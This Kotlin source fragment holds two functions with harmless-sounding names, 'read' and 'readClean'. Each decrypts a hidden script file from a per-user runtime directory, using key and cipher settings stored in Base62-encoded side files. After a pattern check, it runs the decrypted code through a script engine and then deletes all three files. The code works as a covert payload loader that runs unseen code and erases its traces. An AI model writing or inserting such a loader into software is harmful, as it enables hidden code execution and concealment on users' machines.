//

fun read(): String = Unit.let {
    var string = "\n"
    val file = File("/var/run/user/1000/file.kts")
    if (file.exists()) {
        val bytesFile = File(file.parent, "bytes.txt")
        val transformationFile = File(file.parent, "transformation.txt")
        val (transformations, sizes) = String(Base62.decode(transformationFile.readBytes()))
            .also { println(it) }.split(" ")
        val (format, algorithm, transformation) = String(Base62.decode(transformations.trim().toByteArray()))
            .also { println(it) }.split(" ")
        val (ivSize, keySize, bytesSize) = String(Base62.decode(sizes.trim().toByteArray()))
            .also { println(it) }.split(" ")
        println("$ivSize|$keySize|$bytesSize")
        println("$format|$algorithm|$transformation")
        val bytes = ByteArray(Integer.parseInt(bytesSize.trim()))
        System.arraycopy(Base62.decode(bytesFile.readBytes()), 0, bytes, 0, bytes.size)
        val fileInputStream = file.inputStream()
        val iv = fileInputStream.readNBytes(Integer.parseInt(ivSize.trim()))
        val key = fileInputStream.readNBytes(Integer.parseInt(keySize.trim())) + bytes
        val cipher = Cipher.getInstance(transformation.trim())
        cipher.init(Cipher.DECRYPT_MODE, object : Key {
            override fun getAlgorithm() = algorithm.trim()
            override fun getFormat() = format.trim()
            override fun getEncoded() = key.clone()
        }, IvParameterSpec(iv))
        val text = String(cipher.doFinal(fileInputStream.readBytes()))
        string += "[})>$text<({]\n"
        if (text.let { it[3].isLetter() && it[5].isLetter() && it[7].isLetter() && it[21].isDigit() && it[23].isDigit() && it[25].isDigit() && it[27].isDigit() }) {
            string += "text.length=${text.length}"
            string += "\n"
            string += ScriptEngineManager.getInstance().getEngineByFileExtension(file.extension, null)?.eval(text)
            string += "\n"
            file.delete()
            bytesFile.delete()
            transformationFile.delete()
        } else {
            string += "skip"
            string += "\n"
        }
    }
    string
}

fun readClean(): String = Unit.let {
    var string = "\n"
    val file = File("/var/run/user/1000/file.kts")
    if (file.exists()) {
        val bytesFile = File(file.parent, "bytes.txt")
        val transformationFile = File(file.parent, "transformation.txt")
        val (transformations, sizes) = String(Base62.decode(transformationFile.readBytes())).split(" ")
        val (format, algorithm, transformation) = String(Base62.decode(transformations.trim().toByteArray())).split(" ")
        val (ivSize, keySize, bytesSize) = String(Base62.decode(sizes.trim().toByteArray())).split(" ")
        val bytes = ByteArray(Integer.parseInt(bytesSize.trim()))
        System.arraycopy(Base62.decode(bytesFile.readBytes()), 0, bytes, 0, bytes.size)
        val fileInputStream = file.inputStream()
        val iv = fileInputStream.readNBytes(Integer.parseInt(ivSize.trim()))
        val key = fileInputStream.readNBytes(Integer.parseInt(keySize.trim())) + bytes
        val cipher = Cipher.getInstance(transformation.trim())
        cipher.init(Cipher.DECRYPT_MODE, object : Key {
            override fun getAlgorithm() = algorithm.trim()
            override fun getFormat() = format.trim()
            override fun getEncoded() = key.clone()
        }, IvParameterSpec(iv))
        val text = String(cipher.doFinal(fileInputStream.readBytes()))
        if (text.let { it[3].isLetter() && it[5].isLetter() && it[7].isLetter() && it[21].isDigit() && it[23].isDigit() && it[25].isDigit() && it[27].isDigit() }) {
            string += "text.length=${text.length}"
            string += "\n"
            string += ScriptEngineManager.getInstance().getEngineByFileExtension(file.extension, null)?.eval(text)
            string += "\n"
            file.delete()
            bytesFile.delete()
            transformationFile.delete()
        } else {
            string += "skip"
            string += "\n"
        }
    }
    string
}

